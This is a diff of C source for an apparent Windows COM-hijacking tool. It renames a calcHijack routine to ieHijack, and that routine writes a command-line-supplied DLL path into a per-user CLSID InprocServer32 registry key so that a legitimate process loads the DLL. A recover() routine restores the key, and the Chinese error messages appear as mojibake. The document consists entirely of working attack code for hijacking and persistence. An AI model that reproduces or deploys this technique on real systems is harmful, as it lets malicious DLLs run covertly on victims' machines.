@@ -16,19 +16,19 @@ BOOL TestMutex()
 	return 1;
 }
 
-BOOL calcHijack(char payload[])
+BOOL ieHijack(char payload[])
 {
 	HKEY hKey;
 	DWORD dwDisposition;
 	if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
 		"Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32",
 		0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition)) {
-		printf("´ò¿ª×¢²á±íÊ§°Ü£¡");
+		printf("æ‰“å¼€æ³¨å†Œè¡¨å¤±è´¥ï¼");
 		exit(-1);
 	}
 
 	if (ERROR_SUCCESS != RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)payload, (1 + lstrlenA(payload)))) {
-		printf("ÉèÖÃDLLÎÄ¼şÊ§°Ü£¡");
+		printf("è®¾ç½®DLLæ–‡ä»¶å¤±è´¥ï¼");
 		exit(-1);
 	}
 
@@ -45,12 +45,12 @@ BOOL recover()
 	if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
 		"Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32",
 		0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition)) {
-		printf("´ò¿ª×¢²á±íÊ§°Ü£¡");
+		printf("æ‰“å¼€æ³¨å†Œè¡¨å¤±è´¥ï¼");
 		exit(-1);
 	}
 
 	if (ERROR_SUCCESS != RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)payload, (1 + lstrlenA(payload)))) {
-		printf("ÉèÖÃDLLÎÄ¼şÊ§°Ü£¡");
+		printf("è®¾ç½®DLLæ–‡ä»¶å¤±è´¥ï¼");
 		exit(-1);
 	}
 	printf("[+] Recover successfully!");
@@ -67,7 +67,7 @@ void hijack(
 	if (strlen(lpCmdLine) != 0)
 	{
 		TestMutex();
-		calcHijack(lpCmdLine);
+		ieHijack(lpCmdLine);
 	}
 	else
 	{
